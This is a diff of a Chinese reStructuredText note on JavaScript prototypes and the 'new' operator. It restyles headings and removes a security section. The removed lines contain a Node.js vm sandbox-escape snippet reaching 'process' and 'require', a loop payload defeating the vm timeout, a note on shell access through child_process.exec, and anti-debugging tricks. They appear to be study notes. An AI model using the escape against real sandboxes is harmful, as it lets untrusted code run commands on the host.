@@ -1,11 +1,8 @@
-JavaScript
-================================
-
 原型链
--------------------------------
+========================================
 
 显式原型和隐式原型
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+----------------------------------------
 JavaScript的原型分为显式原型（explicit prototype property）和隐式原型（implicit prototype link）。
 
 其中显式原型指prototype，是函数的一个属性，这个属性是一个指针，指向一个对象，显示修改对象的原型的属性，只有函数才有该属性
@@ -22,7 +19,7 @@ JavaScript的原型分为显式原型（explicit prototype property）和隐式�
   Note: Object.prototype 这个对象是个例外，它的__proto__值为null
 
 new 的过程
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+----------------------------------------
 
 .. code-block:: javascript
 
@@ -45,7 +42,7 @@ new的过程拆分成以下三步：
 这段代码会返回true。说明我们步骤2是正确的。
 
 示例
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+----------------------------------------
 
 .. code-block:: javascript
 
@@ -61,48 +58,3 @@ new的过程拆分成以下三步：
 p是一个引用指向Person的对象。我们在Person的原型上定义了一个sayName方法和age属性，当我们执行p.age时，会先在this的内部查找（也就是构造函数内部），如果没有找到然后再沿着原型链向上追溯。
 
 这里的向上追溯是怎么向上的呢？这里就要使用 ``__proto__`` 属性来链接到原型（也就是Person.prototype）进行查找。最终在原型上找到了age属性。
-
-
-沙箱逃逸
--------------------------------
-
-exp
-
-.. code-block:: javascript
-
-    const sandbox = {};
-    const whatIsThis = vm.runInNewContext(`
-        const ForeignObject = this.constructor;
-        const ForeignFunction = ForeignObject.constructor;
-        const process = ForeignFunction("return process")();
-        const require = process.mainModule.require;
-        require("fs");
-    `, sandbox);
-
-.. code-block:: javascript
-
-    vm.runInNewContext(
-      'Promise.resolve().then(()=>{while(1)console.log("foo", Date.now());}); while(1)console.log(Date.now())',
-      {console:{log(){console.log.apply(console,arguments);}}},
-      {timeout:5}
-    );
-
-
-命令执行
--------------------------------
-
-Node.js中child_process.exec命令调用的是/bin/sh，故可以直接使用该命令执行shell
-
-
-反调试技巧
--------------------------------
-
-- 函数重定义 ``console.log = function(a){}``
-- 定时断点 ``setInterval(function(){debugger}, 1000);``
-
-
-参考链接
--------------------------------
-- `JavaScript反调试技巧 <http://www.freebuf.com/articles/system/163579.html>`_
-- `ECMAScript Language Specification <http://www.ecma-international.org/ecma-262/5.1/#sec-15.3.4.5>`_
-- `js prototype <https://www.zhihu.com/question/34183746?sort=created>`_
